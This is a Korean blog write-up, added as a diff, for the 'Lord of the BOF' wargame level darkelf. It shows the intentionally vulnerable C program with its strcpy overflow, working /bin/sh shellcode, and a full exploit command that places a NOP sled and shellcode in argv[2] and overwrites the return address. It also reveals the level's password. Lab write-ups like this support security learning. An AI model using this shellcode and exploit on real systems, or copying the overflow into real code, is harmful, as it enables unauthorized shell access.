@@ -1,0 +1,112 @@
+---
+layout: post
+title:  "[LOB]Level06. darkelf"
+subtitle:   "[LOB]wolfman → darkelf"
+categories: Wargame[LOB]
+tags:
+- Wargame
+- LOB
+- Write-up
+---
+
+## keyword : check length of argv[1] + egghunter + bufferhunter
+
+```c
+/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - darkelf
+        - egghunter + buffer hunter + check length of argv[1]
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+
+extern char **environ;
+
+main(int argc, char *argv[])
+{
+	char buffer[40];
+	int i;
+
+	if(argc < 2){
+		printf("argv error\n");
+		exit(0);
+	}
+
+	// egghunter
+	for(i=0; environ[i]; i++)
+		memset(environ[i], 0, strlen(environ[i]));
+
+	if(argv[1][47] != '\xbf')
+	{
+		printf("stack is still your friend.\n");
+		exit(0);
+	}
+
+	// check the length of argument
+	if(strlen(argv[1]) > 48){
+		printf("argument is too long!\n");
+		exit(0);
+	}
+
+	strcpy(buffer, argv[1]);
+	printf("%s\n", buffer);
+
+    // buffer hunter
+    memset(buffer, 0, 40);
+}
+```
+
+
+
+------
+
+
+
+### 0x01. Analysis
+
+
+
+argv[1]의 크기가 48보다 크면 안된다.
+
+해당 문제 argv[1]의 크기를 제한하고 있으니 argv[2]에 넣으면 끝 아닌가? 😏
+
+
+
+------
+
+
+
+### 0x02. Exploit
+
+
+
+```
+shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+```
+
+argv[2]에 NOP슬라이드와 쉘코드를 넣기 위해 core덤프를 통해 해당 주소를 구해오자.
+
+
+
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/06.darkelf/image-20180829014308881.png" width="700px">
+
+
+
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/06.darkelf/image-20180829015830365.png" width="600px">
+
+argv[2]의 주소는 0xbffffbde로 확인되었다.
+
+
+
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/06.darkelf/image-20180829014955949.png" width="700px">
+
+
+
+```
+./darkelf `python -c 'print "A"*44+"\xde\xfb\xff\xbf"'` `python -c 'print "\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
+```
+
+
+
+**darkelf / kernel crashed**
